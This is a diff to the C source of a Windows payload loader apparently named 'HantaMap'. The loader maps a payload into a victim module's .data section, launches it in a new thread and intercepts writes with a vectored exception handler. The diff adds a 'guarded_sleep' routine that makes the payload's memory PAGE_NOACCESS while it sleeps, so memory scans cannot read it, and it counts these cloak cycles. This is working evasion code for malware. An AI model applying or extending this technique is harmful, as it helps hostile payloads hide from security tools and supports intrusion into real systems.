@@ -33,6 +33,24 @@ static SIZE_T g_payload_size = 0;
 static DWORD  g_tls_index    = TLS_OUT_OF_INDEXES;
 
 static volatile LONG g_veh_count = 0;
+static volatile LONG g_cloak_count = 0;
+
+/* ---------- guarded sleep trampoline ---------- */
+
+/*
+ * Called by the payload instead of Sleep. Runs from the mapper's .text.
+ * Flips payload pages to PAGE_NOACCESS (reads/writes/scans blocked),
+ * sleeps, then flips back to PAGE_EXECUTE. The payload is unreadable
+ * for the entire sleep duration.
+ */
+static void __attribute__((ms_abi)) guarded_sleep(DWORD ms)
+{
+    DWORD old;
+    VirtualProtect(g_hijack_base, g_hijack_size, PAGE_NOACCESS, &old);
+    InterlockedIncrement(&g_cloak_count);
+    Sleep(ms);
+    VirtualProtect(g_hijack_base, g_hijack_size, PAGE_EXECUTE, &old);
+}
 
 /* ---------- VEH ---------- */
 
@@ -223,7 +241,8 @@ int main(void)
     /* launch payload */
     BYTE *entry = map_base + entry_off;
     printf("[*] launching payload at %p\n", (void *)entry);
-    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry, NULL, 0, NULL);
+    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry,
+                             (LPVOID)guarded_sleep, 0, NULL);
     if (!ht) { printf("[!] CreateThread: %lu\n", GetLastError()); return 1; }
 
     Sleep(2000);
@@ -273,8 +292,8 @@ int main(void)
 
     printf("\n=== HantaMap active ===\n");
     printf("  %s .data at %p\n", victim, (void *)map_base);
-    printf("  VEH intercepts: %ld\n", (long)g_veh_count);
-    printf("  PAGE_EXECUTE\n");
+    printf("  VEH write intercepts: %ld\n", (long)g_veh_count);
+    printf("  Cloak cycles (PAGE_NOACCESS during sleep): %ld\n", (long)g_cloak_count);
     printf("\n[*] Enter to exit\n");
     getchar();
 
